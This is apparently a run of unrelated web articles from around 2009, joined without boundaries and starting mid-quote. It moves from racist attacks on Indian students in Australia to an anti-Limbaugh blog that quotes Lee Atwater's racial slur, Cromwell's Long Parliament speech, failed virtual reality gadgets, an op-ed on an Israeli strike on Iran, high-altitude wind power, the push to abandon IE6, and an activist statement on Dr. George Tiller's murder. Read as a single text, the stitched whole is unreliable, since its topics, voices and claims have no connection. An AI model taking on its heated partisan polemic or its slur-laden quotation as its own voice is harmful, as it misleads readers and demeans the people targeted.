" leaves religion on the solid foundation of its own inherent validity , without any connection with temporal authority , and no kind of oppression can take place . "

Till a few days ago , Australia was one of my favourite places in the world .
I ’ve always found the country beautiful and the people warm and friendly – and a shared passion for sports certainly helps .
But I guess a tourist , or even a person travelling on work , experiences a country very differently from people who actually live there .
Ever since reports of recent attacks on Indians in Australia began coming in , I ’ve been in touch with friends and relatives who have lived there or continue to do so .
I asked the same question to each one , " Have you ever personally encountered racism in Australia ? "
They all shared their experiences readily enough , but requested that I not identify them .
The first person I spoke to is a journalist whose husband did a PhD in Australia .
" No , we never encountered any kind of racism personally , though we did find a lot of ignorance about India .
And , of course , there are cultural differences you need to be aware of , " she said .
That ’s for sure .
I ’ve always found it ironic that the Australians were apparently OK with Harbhajan Singh insulting the mother of Andrew Symonds , but regarded ‘ monkey ’ as a deadly insult .
In India , of course , it would be exactly the other way around .
However , she then added , " I worked with the online arm of a leading Australian paper , and I used to moderate chats .
And I was shaken by the kind of ugly comments that used to come in about Asians , especially when the Mohd Haneef controversy was on .
I always used to think Indians were oversensitive , but seeing those comments made me realise the depth of antipathy that so many Australians have towards us " .
The couple are now back in India , though they say racism had nothing to do with it .
I spoke to three other people , who have absolutely no intention of returning to India .
" What are you making such a fuss about , " demanded one .
" Did n’t the Shiv Sena target South Indians ?
Is n’t the MNS targeting North Indians ?
Do n’t we treat people from the north - east and Blacks abominably ?
If you say those are isolated incidents , well , so are these .
Why does n’t India fix its own problems before lecturing others ?
This is all just media hype . "
His girlfriend was equally blunt : " As a woman , I feel much safer in Australia than I ever did in India . "
The fifth person was just as categorical .
" I attended one gathering of Indians here and I was appalled .
I found them rude , narrow - minded and completely unwilling to integrate with the mainstream .
This country has offered them its hospitality and resources , and in return they were cribbing about it non-stop .
If they ’re so bloody unhappy , let them go back to India . "
Frankly , I tend to disagree with these arguments .
At least 100 cases of ‘ curry bashing ’ have been reported in the last one year in Australia –- four deadly ones in the past month alone — and many more probably were n’t reported out of fear .
That goes well beyond being “ isolated incidents " .
The fact that thousands of Indian students came out to stage a peaceful rally in Melbourne on Sunday also surely indicates that these concerns are n’t just ‘ media hype ’ .
The very fact that so many attacks could go on for so long seems to indicate a certain lack of sensitivity on the part of Australian authorities — who were quick to initially dismiss these crimes as " opportunistic rather than racist " .
Finally , Australian foreign minister Stephen Smith had to acknowledge that there was a problem and Indian students were being specifically targeted .
One can only hope that this awareness speedily percolates down the ranks of the Australian police and local authorities .
I think India is fully within its rights to be worried about the welfare of its citizens in a foreign country .
Having said that , we certainly need to be as sensitive about how we treat other people — including our own countrymen — as we are about the way we are treated by others .
And there ’s no question that we need to develop a zero - tolerance attitude towards louts who molest women , or assault them just because they happen to be in a pub .
What about the charge that most Indians living abroad form exclusionist groups ?
Even if that ’s true , I think that ’s probably a defensive reaction to perceived hostility from the local population .
Of course , it turns into a vicious spiral .
The more Indians cut themselves off from the mainstream , the more unpopular they become , and the more they retreat into their shell … and so on .
But even then , I do n’t think there can be any justification for the kind of murderous attacks that we ’ve seen on Indians .
Even if you do n’t like someone , that does n’t give you the licence to beat them into a coma .
So , should Indians still go to Australia to study ?
I think they need to ask themselves whether they intend to return to India or not .
If they intend to work in India , it ’s probably worth bearing in mind that most recruiters here have long since outgrown the foreign fixation .
A Harvard or Oxford degree still makes your resume look good , but most recruiters are now much more impressed by a good Indian university than by a B - grade foreign one .
So , students should make sure that the university they intend to go to will carry weight back in India .
Otherwise , they ’ll just have wasted a lot of time , effort and money for nothing .
If the answer is that they want to migrate for good , then my next question is , " Have you considered that India ’s GDP is growing at 6.7 % at a time when most of the developed world is undergoing recession ? "
If they still want to go abroad , then I think they should be able to do so without fearing xenophobic attacks .
And it ’s the responsibility of both the Indian and the relevant Australian government to ensure their safety and well - being .

Aw , hell , let 's call it what it is : hate speech , said with the intention of inflaming racist attitudes towards our first black president .
TPM listed the angry white men falsely attacking President Obama :
• Above all others , the real celebrity here has been Rush Limbaugh .
He 's done this kind of thing before -- remember the " Barack , The Magic Negro " song ?
But in the wake of the Gates incident , he 's managed to become even more hard - edged about it .
" Here you have a black president trying to destroy a white policeman , " Limbaugh declared this past Friday .
Yesterday , he shared a dream he's had about the dangers to capitalism : " I had a dream that I was a slave building a sphinx in a desert that looked like Obama . "
And he joked that food - safety advocates will go after all the unhealthy foods people like to eat , one by one -- but they 'll have to wait until Obama is out of office to ban Oreos .
• Glenn Beck said this today on Fox News : " This president , I think , has exposed himself as a guy , over and over and over again , who has a deep - seated hatred for white people , or the white culture .
I do n't what it is .
You can't sit in a pew with Jeremiah Wright for 20 years and not hear some of that stuff , and not have it wash over . "
•
During his new crusade of Birtherism , Lou Dobbs suggested on his radio show this past Wednesday , right before the Gates flare - up , that Obama could be an illegal immigrant , tying this into his usual preoccupation .
" I 'm starting to think we have a document issue , " Dobbs said .
" You suppose he 's un -- no , I wo n't even use the word ' undocumented , ' it would n't be right . "
Hey Rush , do n't you know that " oreo " is an insult ?
Or will you next be calling the President a " jive turkey " in another lame attempt at humor ?
Glenn
Beck frankly , is on the verge of an on - air nervous breakdown -- and I fully intend to post the video here when it happens .
And Lou Dobbs is just ...... sad .
It 's the Southern Strategy all over again , the divisive Republican political strategy designed to stoke racial fears and take white votes away from the Democratic Party , first successfully employed by Richard Nixon , enthusiastically adopted by Ronald Reagan , and perfected under Karl Rove and George W. Bush .
Lee Atwater , Karl Rove 's political mentor , once said :
'' You start out in 1954 by saying , ' Nigger , nigger , nigger . '
By 1968 you can't say ' nigger ' -- that hurts you .
Backfires .
So you say stuff like forced busing , states ' rights and all that stuff .
You 're getting so abstract now [ that ] you 're talking about cutting taxes , and all these things you 're talking about are totally economic things and a byproduct of them is [ that ] blacks get hurt worse than whites .
'' And subconsciously maybe that is part of it .
I 'm not saying that .
But I 'm saying that if it is getting that abstract , and that coded , that we are doing away with the racial problem one way or the other .
You follow me -- because obviously sitting around saying , ' We want to cut this , ' is much more abstract than even the busing thing , and a hell of a lot more abstract than ' Nigger , nigger . '''
It 's 2009 , but crying " nigger nigger nigger " seems to be coming back in style once more .
As Rachel Maddow pointed out tonight , it almost seems that Public Enemy should update and re-release " Fear of a Black Planet . "
The fear amongst these wingnut pundits is vibrant and palpable , yet their attempts at stoking racial hatred seem almost .... quaint , to borrow Alberto Gonzales ' infamous expression .
In the wake of the Gates arrest , America seems less " post - racial " than it did a few weeks ago , but I can't help but wonder exactly how many people are going to fall for this line of bullshit , this time around .
Tough economic times have always been a time of opportunity for race baiters and sowers of hate and discord .
The recession and the health care debate have more people worried about the basics of life more than any time since 9/11 .
This does n't excuse or condone the words and deeds of these far - right demagogues , but it does give us a glimpse at their worst fears : a time in which the primacy of white men will no longer be .
Fortunately , they in truth have no say in that matter , and they no longer possess the power to forestall that time .
I believe that at the end of the day , a majority of Americans will not fall for their heinous lies .
More and more people are intelligent and informed enough to be immune to the propaganda coming from Rush , Beck , and their ilk .
These frenetic wingnut pundits , and their increasingly desperate and panic - stricken outrage can only , as Lincoln said , fool some of the people some of the time .
It 's getting to that day that 's the hard part .
* " It is high time for me to put an end to your sitting in this place , which you have dishonored by your contempt of all virtue , and defiled by your practice of every vice ; ye are a factious crew , and enemies to all good government ; ye are a pack of mercenary wretches , and would like Esau sell your country for a mess of pottage , and like Judas betray your God for a few pieces of money .
Is there a single virtue now remaining amongst you ?
Is there one vice you do not possess ?
Ye have no more religion than my horse ; gold is your God ; which of you have not barter 'd your conscience for bribes ?
Is there a man amongst you that has the least care for the good of the Commonwealth ?
Ye sordid prostitutes have you not defil'd this sacred place , and turn'd the Lord 's temple into a den of thieves , by your immoral principles and wicked practices ?
Ye are grown intolerably odious to the whole nation ; you were deputed here by the people to get grievances redress'd , are yourselves gone !
So !
Take away that shining bauble there , and lock up the doors .
In the name of God , go ! "
-- Oliver Cromwell MP 's speech on the dissolution of the Long Parliament , given to the House of Commons , April 20 , 1653 .
There was a time when people were calling home virtual reality the wave of the future .
Now most people just call it goofy and expensive .
Here are 7 virtual reality technologies that did n't work , and never will .
The Sensorama
In what may be considered the first case of virtual reality reaching beyond its own limitations , Morton Heilig unveiled the Sensorama in 1962 .
It was a large box that enclosed the viewer 's head and displayed a stereoscopic 3D movie .
The seat tilted and the box unleashed wind and smells .
And all of this was accomplished mechanically .
It was a costly venture , and beyond the prototype , Heilig was forced to stop development on the Sensorama .
His failure then became the model for future virtual reality failures .
The device was cool , but it was also large , expensive , and awkward .
Giant Headsets
There are too many examples of this particular item to pick just one .
It seemed for years that hard - to - wear headsets were a prerequisite for any virtual reality technology .
The earliest virtual reality headsets looked like a giant television strapped to someone 's face .
The technology has advanced since then , with smaller and more economical displays , but the headsets of the past made virtual reality nothing more than a passing , gawky novelty .
Nintendo Virtual Boy
The continuing pathway to the holy grail of devices marketed for home virtual reality gaming is littered with failures .
One of the more reviled , more abject of these failures came from an otherwise reliable company .
I 'm referring to Nintendo 's Virtual Boy .
Nintendo's foray into the virtual reality world promised a few things it could n't deliver .
It promised true 3D graphics on a portable console .
What it delivered was a red - tinged , blurry , semi-3D picture and a clunky headset that needed a stand to operate .
Games came with the option of automatically pausing every 15 minutes for a break , which sounds more like a difficult shift at work than a fun afternoon of virtual reality gaming .
The Virtual Reality Glove
Speaking of Nintendo , it seems every time the company digs into the virtual reality market , they miscalculate .
You may remember the Power Glove from such cinema classics as The Wizard .
The Power Glove recreated the motions of a user wearing it on screen , but the motion tracking was imprecise and the glove was clunky .
The company sold about 100,000 of the gloves in the U.S. Compare that with a more successful technology descended from the Power Glove , the Wii ; Nintendo has sold over 13 million of those so far .
That did n't stop other companies from trying to market similar technologies , though .
The P5 glove for PC gaming required specially designed games and therefore never caught on and the CyberGlove proved too expensive for home use .
As a result , the era of virtual reality gloves quietly ended .
VRML
Turning more to the tech side , VRML was billed as a 3 - D alternative to HTML .
The idea was that users could interact freely with 3 - D worlds on the internet , described by text and interpreted by modeling software .
VRML 's creators envisioned virtual spaces where people could wander in and chat with each other .
The reality was closer to slow - loading , blocky graphic snippets , hardly worth the dial - up bandwidth needed at the time .
In time , Second Life would crop up , and while it was n't as customizable and programmable as VRML , it did offer a similar experience , but with better graphics .
Omnidirectional Treadmills
Beyond the display , control , and coding problems of virtual reality , there 's still the problem of mobility .
When you virtually move forward , you also move forward in the real world , so designers had to find a way of allowing people to walk around while staying in place .
The most common solution is the omnidirectional treadmill .
This device does exactly what it sounds like it would do : it lets users move in any direction on a treadmill .
It 's a good idea in theory , and as early as 1997 working prototypes were created .
But these treadmills are also very expensive and very large .
It 's hard to imagine cramming something like the device pictured here into your living room .
The Virtusphere
Enter the Virtusphere .
Users strap on their VR gear and enter a large translucent sphere .
The experience is something like a large stationary hamster ball : as an individual wanders about , the ball freely rotates to allow the user to wander around in the virtual world .
While the device clearly does what it claims to do , the average home user seems hesitant to play their games trapped inside something that looks like it just popped out of the water and is trying to bring you back to a prison village .
There have , of course , been pretty big advances in virtual reality technology since these failures , but now that the technology has caught up with the vision , it seems like people have bigger visions .
Technologies like internet and personal computers survived their awkward teenage years .
Virtual reality did n't .
The new Israeli prime minister recently appeared to give President Obama a blunt ultimatum : Stop Iran from acquiring nuclear weapons – or we will .
Benjamin Netanyahu's challenge ( intimated in an interview he gave to The Atlantic magazine ) smacks of unrealistic bravado and , worse , it appears to be a crude attempt to bully an American president into bombing Iran 's nuclear installations .
The world should hope it's a hollow threat .
The consequences of a unilateral Israeli strike would be enormous if not disastrous .
Mr. Obama cannot allow himself to be intimidated by Mr. Netanyahu , nor can he wink if the Israeli air force bombs Iran 's nuclear facilities .
Israel has acted unilaterally to squash a perceived nuclear threat before .
In 1981 , Prime Minister Menachem Begin sent fighter jets to knock out Iraq 's " Osirak " nuclear reactor .
Israel claimed that Saddam Hussein was on the verge of obtaining nuclear weapons and that it had no choice but to bomb it out of existence .
In 2007 , Israel bombed a facility in Syria it claimed was a nuclear reactor .
Any strike on Iranian reactors would be a different matter entirely .
Osirak was a lone , poorly guarded , and inoperative nuclear plant that had a year earlier been damaged by an Iranian airstrike .
The Iranians have taken considerable precautions to build their facilities on something more solid than desert sand .
At present there is but one facility , Bushehr I , but Tehran is gearing up to build an entire network of nuclear plants .
Israel would be bombing until the Shah comes home to merely delay what is an unstoppable Iranian nuclear program .
The fallout from Israel 's strike on Osirak was serious but limited .
But a preemptive strike on Iranian soil would border on catastrophic .
Consider :
• Iran has signaled that if attacked , it would close the Strait of Hormuz , through which 20 percent of the world 's oil flows .
This would plunge the world into economic calamity .
• Hezbollah , Iran 's proxy army in Lebanon , is believed to have more than 42,000 missiles , according to Defense Minister Ehud Barak – enough to make Israeli cities such as Haifa and Tel Aviv burn like London did during the Nazis ' Blitz .
Hezbollah is believed to have terror cells in Europe and North America .
It has struck in South America , and many terrorism experts believe it is potentially even more dangerous than Al Qaeda .
Iran , using this proxy force , would probably unleash it on the world if Netanyahu were to bomb the Bushehr I reactor .
• It would trigger a tsunami of anti-Semitism that would inevitably translate into violence against Jews worldwide .
• Such a strike would be perceived as further evidence of a US - Israeli global war on Islam .
Islamist fighters from Marrakesh , Marseille , London , Cairo , Karachi , and Tehran would enlist overnight by the thousands and march to Iraq and Afghanistan to wage jihad against the American troops there .
Netanyahu is no fool .
He is keenly aware of these global implications .
He knows that a unilateral Israeli strike would not only accelerate Iran 's nuclear ambitions but also legitimize them .
He also knows that Iranian President Mahmoud Ahmadinejad 's threat to wipe Israel off the map is bombast .
It is the country 's supreme leader , Ali Khamenei , who commands the armed forces and national security apparatus , not the populist president .
Domestic Israeli politics may have been a factor motivating Netanyahu 's warnings .
Talking tough soothes anxieties at home .
Equally likely , Netanyahu was prodding the new Obama government .
And in that sense he may feel the recent US - led invitation to Tehran to meet with Washington and five other major powers to discuss the disputed nuclear program was a result of his threat .
Iran has agreed to " constructive dialogue , " although it may be delusional for the Israeli prime minister – or any other Western leader – to believe that political or economic pressure can sway Iran 's ruling clerics .
What 's worrying is that Netanyahu had a record of bad judgment in his previous term as prime minister from 1996 to 1999 .
Not without cause did The Economist run a cover photo of " Bibi " in October 1997 under the headline " Israel 's Serial Bungler . "
It described his governance of the Jewish state as a " calamity " for the peace process .
Iran has no need to nuke Israel .
Its ruling clerics , whom Netanyahu described as a " messianic apocalyptic cult , " believe time , history , and Allah are on their side .
They believe the Jewish state , starting across the border in Lebanon , can be nibbled to death over the next century just as the Arabs did to the Crusader kingdoms 600 years ago .
It should surprise no one that Iran 's mullahs want nuclear weapons .
They live in a nuclear neighborhood : Pakistan , India , Russia , China , and Israel , which is estimated to have 200 nuclear bombs ready to use if it were attacked .
The ayatollahs also remember Mr. Hussein 's 1991 folly of going to war with the US without nuclear weapons .
Obama needs to do Netanyahu a favor and tell the Israelis : " No first strike . "
Keep the F - 15s and F - 16s at home .
A messianic vision such as Mr. Ahmadinejad 's is rife in much of the Islamic world .
Bellicose rhetoric most often serves as an excuse for inaction .
It does not denote suicidal inclinations on the part of Iran 's more pragmatic leaders .
Walter Rodgers , a former senior international correspondent for CNN , writes a biweekly column for the Monitor 's weekly print edition .
The wind blowing through the streets of Manhattan could n't power the city , but wind machines placed thousands of feet above the city theoretically could .
The first rigorous , worldwide study of high - altitude wind power estimates that there is enough wind energy at altitudes of about 1,600 to 40,000 feet to meet global electricity demand a hundred times over .
The very best ground - based wind sites have a wind - power density of less than 1 kilowatt per square meter of area swept .
Up near the jet stream above New York , the wind power density can reach 16 kilowatts per square meter .
The air up there is a vast potential reservoir of energy , if its intermittency can be overcome .
Even better , the best high - altitude wind - power resources match up with highly populated areas including North America 's Eastern Seaboard and China 's coastline .
" The resource is really , really phenomenal , " said Cristina Archer of Cal State University - Chico , who co-authored a paper on the work published in the open- access journal Energies .
" There is a lot of energy up there , but it 's not as steady as we thought .
It 's not going to be the silver bullet that will solve all of our energy problems , but it will have a role . "
For centuries , we 've been using high - density fossil fuels , but peaking oil supplies and climate concerns have given new life to green technologies .
Unfortunately , renewable energy is generally diffuse , meaning you need to cover a lot of area to get the energy you want .
So engineers look for renewable resources that are as dense as possible .
On that score , high - altitude wind looks very promising .
" We might extend the application of [ wind ] power to the heights of the clouds , by means of kites . " utopian technologist John Etzler , 1833
Wind 's power — energy which can be used to do work like spinning magnets to generate electricity — varies with the cube of its speed .
So , a small increase in wind speed can lead to a big increase in the amount of mechanical energy you can harvest .
High - altitude wind blows fast , is spread nicely across the globe , and is easier to predict than terrestrial wind .
These properties have led inventors and scientists to cast their hopes upward , where strong winds have long been known to blow , as Etzler 's dreamy quote shows .
During the energy shocks of the 1970s , when new energy ideas of all kinds were bursting forth , engineers and schemers patented several designs for harnessing wind thousands of feet in the air .
The two main design frameworks they came up with are still with us today .
The first is essentially a power plant in the sky , generating electricity aloft and sending it down to Earth via a conductive tether .
The second is more like a kite , transmitting mechanical energy to the ground , where generators turn it into electricity .
Theoretically , both approaches could work , but nothing approaching a rigorous evaluation of the technologies has been conducted .
The Department of Energy had a very small high - altitude wind program , which produced some of the first good data about the qualities of the wind up there , but it got axed as energy prices dropped in the 1980s and Reagan - era DOE officials directed funds elsewhere .
The program has n't been restarted , despite growing attention to renewables , but that 's not because it 's considered a bad idea .
Rather , it is seen as just a little too far out on the horizon .
" We 're very much aimed these days at things that we can fairly quickly commercialize , like in the next 10 years or so , " said National Renewable Energy Laboratory spokesperson George Douglas .
Startups like KiteGen , Sky Windpower , Magenn , and Makani ( Google 's secretive fundee ) have come into the space over the last several years , and they seem to be working on much shorter timelines .
" We are not that far from working prototypes , " Archer said , though she noted that the companies are all incredibly secretive about the data from their testing .
Magenn CFO Barry Monette said he expects " first revenue " next year when they sell " two to four " working prototypes of their blimpy machine , which will operate at much lower altitudes .
" We do think that we 're going to be first [ to market ] , unless something happens , " Monette said .
In the long term , trying to power entire cities with machines like this would be difficult , largely because even in the best locations , the wind will fail at least 5 percent of the time .
" This means that you either need backup power , massive amounts of energy storage , or a continental - or even global - scale electricity grid to assure power availability , " said co-author Ken Caldeira , an ecologist at Stanford University .
" So , while high - altitude wind may ultimately prove to be a major energy source , it requires substantial infrastructure . "

Below , you can see a rendering of Sky Windpower 's generator , which Archer described as " a controlled helicopter . "
Its generator acts as a motor for propulsion upwards until it reaches wind levels suitable for power generation .
Then , it switches modes and begins making electricity from the wind .
Below , you can see several generations of what the company calls its Flying Electric Generators .
Any machine like this would have to be pulled down during thunderstorms to avoid loss of control and crashing .
That remains a risk until the technology 's operational safety has been proven .
KiteGen takes an altogether different approach to generating power .
Unlike the two technologies above , KiteGen uses automatically controlled kites flying in figure eights to harness the wind 's power .
The company envisions hooking up many of these kites flying several thousand feet high to a central station that would rotate .
That motion would power a generator .

Just six years ago , the web was dominated by one browser : Internet Explorer , specifically Internet Explorer 6 .
Without Netscape to compete against it and the ability to bundle its browser with Windows XP , Microsoft experienced superior market share - up to 95 % at the peak .
Today though , we have far superior browsers like Firefox , Safari , Opera , and Chrome , as well as Internet Explorer 8 .
So why is 15 to 25 percent of the world 's browsing still done in a browser created in the digital Stone Age ( aka 2001 ) ?
As a coder , designer , and UI guy , it 's difficult to put into words how many extra man hours I and others have dedicated to make websites compatible with the outdated browser .
Despite the difficulty presented by IE6 though , the web 's done alright .
But with the coming release of HTML 5 , we 're about to hit a breaking point where innovation will be stifled if websites must continue to cater to this browser .
Here 's what 's happening in the next few months and , more importantly , why we must force ourselves off IE6 if the web is to grow .
The Issue with Internet Explorer 6
Yeah ...
Facebook does n't like IE6 ...
You might be asking yourself two questions right about now :
What 's so bad about IE6 ?
And why do so many people still use it ?
The answer to the first question is relatively simple : Internet Explorer 6 is outdated technology in a rapidly - changing Internet landscape .
Imagine trying to use the social web , Microsoft Office , iTunes , IM , your video games , and all of your desktop apps ... with a computer from 2001 ( 20 GB of space , 256 MB of RAM , anyone ? ) .
It 's the same thing : a great deal of new web technology is simply incompatible with IE6 .
A short list of things IE6 does not support , of which coders probably know them all :
- CSS v2 ( Cascading Style Sheets ) :
This is the code that enables almost all design on the web .
In other words , designers have to hack up websites just to make them load in IE6 .
- PNG
Transparency : A great deal of .png images do n't display correctly in IE6 .
It basically kills using them in design work .
- General Security : Just like not updating your virus software can get you riddled with spyware , not updating your browser can be a gateway to attacks .
There are even code snippets that will shut down IE6 .
I wo n't tell you what they are , but you can find them on Wikipedia .
It 's unstable .
- Digg , Facebook , and YouTube ( soon ) : Both Digg and YouTube have announced that they 're cutting back on IE6 support .
Facebook already gives you suggestions for better browsers if you try to log in with IE6 .
You wo n't be able to Digg articles or browse YouTube via IE6 in the near future .
Other companies have cited IE6 as holding them back as well .
37 Signals , the maker of some of the most popular web - based business apps around ( i.e. Basecamp ) very publicly cut support for IE6 because according to them , " continued support of IE 6 means that we can't optimize our interfaces or provide an enhanced customer experience in our apps . "
Now , if you 're wondering why people still use the outdated IE6 browser , there are two primary reasons most people point to : the fact that it is the standard browser of Windows XP ( which is still the most used operating system around ) , and the fact that many corporate IT departments do n't see the need to upgrade - and find upgrading to be too much of a hassle .
Without a significant event like Google not loading in IE6 , people have stayed content with their current browser .
Still , the web has somehow gotten by with these IE6 - imposed limitations .
However , there 's a new technology that will take over the web .
It 's also one that IE6 will not be able to handle at all : HTML 5 .
The Next Step : HTML 5
HTML ( hypertext markup language ) is the code that helps shape the world wide web - you 've all probably used an HTML tag ( especially if you blog ) or played with HTML at some point .
HTML 5 is the next revision of the HTML language , and the features that are coming with it are a doozy , especially since its core spec editors ( Ian Hickson and Dave Hyatt ) are from Google and Apple respectively .
Google in particular is pushing it because it can really enhance the usability and possibilities of web development .
At this year 's Google I/ O conference , they presented some of the things it will be able to do .
Some of the coolest :
- Video Tag :
By tagging a video with < video > , you can embed a video straight through HTML .
Because of this , you can really control the look and feel of the video .
- Audio Tag :
The same thing as video , audio embedding becomes a lot easier .
- Time :
The tag will help browsers recognize time in HTML pages .
There 's also < meter > for numeric values .
- Drag and Drop :
While there 's still wrangling on this point , with HTML 5 you will eventually be able to drag and drop files right on the browser .
This is most notable for Google 's upcoming communication product , Google Wave , a big reason why Google 's pushing hard for this .
- Local Storage : Web apps work just like desktop apps nowadays , except they can't easily save work right to your computer .
HTML 5 fixes that problem .
- Geolocation : With HTML 5 , you should be able to make web apps that can determine your location and provide you more relevant information .
With the rise of location - based mobile services , this is important .
- Canvas :
The canvas HTML element allows for scriptable bitmaps .
What that means is that you can create beautiful graphics or imagery on the fly within HTML , meaning the interface of many web apps can become a lot more dynamic and richer .
Mozilla Bespin is a big project for code editing using HTML 5 , one that - you guessed it - wo n't work in IE6 .
Like any good language , more functionality will be added to HTML 5 as time goes on .
If you want to have a more complete overview of HTML 5 , I suggest reading the IBM Technical Library , but the point is this : while old browsers will still work with websites in HTML 5 , they will simply not get anywhere near the same functionality .
And with more and more companies dropping support for IE6 , its users are going to be left out .
IE6 Has Stifled Innovation Long Enough
We 've sputtered on with the dead weight of IE6 since 2001 , but we 're just now reaching a breaking point , and companies are starting to feel it .
YouTube and Digg clearly believe that it's not in their best interests to continue supporting the outdated browser and thus have put the word out about their plans to phase out support .
More and more companies will take their lead as it becomes harder and harder to justify the cost of keeping a site running correctly in Microsoft 's old browser .
But looking forward , HTML 5 standards will enable the building of richer web applications .
More and more of our lives are on the web , and our use of web apps like Facebook has skyrocketed .
Google 's even announced Google Chrome OS , an operating system that will run web apps instantaneously because it is built on the browser .
But projects as rich as Google Wave will not realize their full potential ( or run at all ) if they must cater to a browser that runs on outdated standards .
IE6 was fine enough for use in 2001 , but for web apps to evolve and grow into tools that run just as seamlessly as desktop apps , the browser that requires the most hacks , time , and energy to make things work must be set aside .
The only way at this point that people will upgrade is if their favorite web tools do n't work in IE6 and for new technologies to look forward to HTML 5 , and not backwards to outdated technologies .
In short , we 're at a crossroads , and for us to get past them , IE6 must go away as a browser and as a concern for developers and users everywhere .

Dr. Tiller 's Murder : Fascist Terrorism
and Its Pampered Apologists
By Mara Verheyden - Hilliard
Attorney and co-founder of the Partnership for Civil Justice
Statement on behalf of the A.N.S.W.E.R. Coalition
George Tiller after being shot
in both arms in 1993 .
Leilah Ramzah , 16 , lays a stuffed bear
at the entrance to Women 's Health Care
Services following Dr. Tiller 's death .
The rampant terrorism and violence against women and health care professionals who dare to provide women 's health services took its latest victim when Dr. George Tiller was brutally gunned down in his church on Sunday in Wichita , Kansas .
The government and the corporate media coddle these anti-women terrorists .
In the last 30 years , right - wing bigots have carried out 5,800 reported acts of violence against women 's health care providers , including targeted assassination , bombings , arsons , death threats , kidnappings and assaults , according to NARAL .
Hundreds of thousands , and perhaps millions , of women have been assaulted and harassed by the right wing as they tried to see a doctor .
The Fascist Strategy
By targeting and intimidating health care providers , the fascist movement hopes to effectively ban abortion services in the United States .
If they were to succeed , not only would it deprive women of their fundamental right to control their own bodies , it would be a health care catastrophe .
One out of three women in the U.S. have an abortion by the time they are 45 , according to Planned Parenthood .
The only question is whether women will be maimed or left to die because they cannot access quality health providers .
Dr. Tiller took over his medical practice from his father , a doctor who began performing abortions himself in the 1940s after a patient whom he refused to help died in a back - alley abortion .
Dr. Tiller , like many other health care heroes , kept providing abortion services to women despite the threats .
He had been shot previously in both arms ; had his office bombed , shot at and frequently vandalized ; and he and his patients were routinely threatened , intimidated and attacked .
Dr. Tiller kept providing health care services because , as his family said in a statement , he was “ a dedicated servant on behalf of the rights of women everywhere . ”
He was past retirement age , with four children and 10 grandchildren , and he lived under a virtual military siege because of the terrorist threats .
But he did n't stop .
It Was n't Just the Gunman
This assassination is the culmination of a coordinated assault by the right wing .
This included the Kansas Attorney General 's efforts to prosecute Tiller , the demonization of Dr. Tiller by Bill O'Reilly , who ran dozens of hit pieces targeting him as a " murderer , " and by " Operation Rescue , " which prominently called him " America 's Doctor of Death . "
In the aftermath of the murder , amid reports that the killer had worked with them , Operation Rescue scrambled to take down their prominent " Tiller Watch " webpage , apparently sanitizing it , while their founder continued to call Dr. Tiller a " mass murderer ” and held a press conference to do so .
The New York Times coverage of the murder was pathetic .
On its front page it stated , " Officials offered little insight into the motive , saying that they believed it was ' the act of an isolated individual ' but that they were also looking into 'his history , his family , his associates . ' "
The decision to question or suggest uncertainty as to the killer ’s " motive " reflects an effort to depoliticize and isolate this most violent of political acts and to disconnect the killing from right - wing groups who seek as their goal to deprive women of their rights using assassination as they see fit .
Some right - wing groups and leaders have been quick to announce that the killing was not a homicide , but a justifiable act of " salvation . "
The mass media has leapt to the defense of many anti-woman , right - wing groups who directly targeted Dr. Tiller by giving their spokespeople more time in the wake of Dr. Tiller 's death to express their primary grievance with his murder -- that it might make them look bad .
Fake Terrorism and Real Terrorism
In recent months , Dr. Tiller reported to the FBI that the threats were increasing .
Obviously , stopping real terrorism is not a " priority " for the FBI , which has allocated limitless resources to infiltrate and sabotage lawful political organizing all over the country .
The FBI and police have disrupted and spied on progressive organizations that built a powerful anti-war movement in the last years .
They have paid agents provocateur to infiltrate and frame up organizations and individuals engaged in dissent .
Nor is any mosque or Muslim community center safe from FBI infiltration and disruption activities .
From Southern California to upstate New York , undercover FBI agents are trying to entrap Muslim youth into " terrorist " plots that emanate from the FBI itself .
The U.S. government 's use of the terrorist label is used to frame up and imprison Muslims in the United States .
Just last week in Dallas , representatives of the Holy Land Foundation ( HLF ) were sentenced to as much as 65 years in prison for the “ terrorist ” crime of raising money for desperately needed humanitarian relief .
HLF had been the largest Muslim charity in the U.S.
The charity 's " crime " was that the humanitarian relief was going to those starving and dying in Gaza and elsewhere in Palestine .
The U.S. government has determined that it is an act of terrorism to get medicine to hospitals and food to children when U.S. foreign policy supports the strangulation of a civilian population for geostrategic reasons .
When Anthrax Threats Were No Big Deal
Yet , when it comes to the right - wing organizations that engage in violence and threats , the FBI and the corporate media are conspicuously mute .
For instance , shortly after the September 11 attacks , letters containing anthrax were sent to media and Senate offices .
Hundreds of anthrax threats were also sent to reproductive health clinics , according to the website of NARAL , which states : " Between October 15 and 23 , 2001 , more than 250 abortion and family planning clinics in 17 states and the District of Columbia received letters purporting to contain anthrax .
In each instance , a powdery substance was accompanied by a letter stating , ' You have been exposed to anthrax .
We are going to kill all of you . '
An additional 270 letters were sent to clinics during the first week of November . "
Very few people know about this kind of extreme terrorist intimidation .
Can you imagine the reaction of the FBI and the media if anti-war organizers or Arab Americans were linked to anthrax threat letters ?
There would be screaming headlines and nationwide police sweeps .
Coddling Right Wing Terrorists
But in 2007 , in Washington , D.C. , when a man showed up at an immigrant rights rally , covertly carrying a map of the demonstration area with sight lines drawn on it , with a cache of weapons including a converted fully automatic M1 - Carbine and apparent plans to massacre participants , you probably never heard about it .
Why ?
Because the man , Tyler Froatz , was a right - wing vigilante bent on attacking immigrants and their supporters .
Froatz , who organized with the Free Republic and acted as a spokesman for the Minuteman , stalked a May Day demonstration in 2007 .
He was arrested after he was confronted by a courageous young woman working as an organizer with the ANSWER Coalition .
She was then assaulted by him when she objected to the racist signs he was posting depicting the graphic slaughter of immigrants , including pregnant women and children .
In addition to the weapons Froatz brought with him , in his apartment was found a large arsenal of rifles , handguns , ammunition , a Molotov cocktail , a hand grenade and a 100,000 - volt taser gun .
So is Froatz in the special terrorist prisons in Terre Haute or Marion ?
No .
He was released to the custody of his parents in Connecticut and thereafter allowed to plead to a minor weapons charge .
The U.S. Attorney ’s Office never charged him with any terrorism - related offense or hate - crimes offense .
And today , members of Froatz ’s group , the Free Republic , celebrated this latest cold - blooded terrorist murder of Dr. Tiller in their postings .
More than Bullet - Proof Vests and Federal Marshals : A New Strategy is Needed
The murder of Dr. Tiller is a misogynist attack against all women .
It is also the foreseeable outcome of a climate of bigotry and vilification fostered by the right wing , normalized by the media and the U.S. government .
A political calculus has been made by the government as to what will be deemed terrorism : what political acts will be crushed and what political violence will be supported or tolerated .
As it stands , there is no mobilized effective counter to this fascist violence and the threat that it poses .
It ’s time for a new strategy and a new challenge .

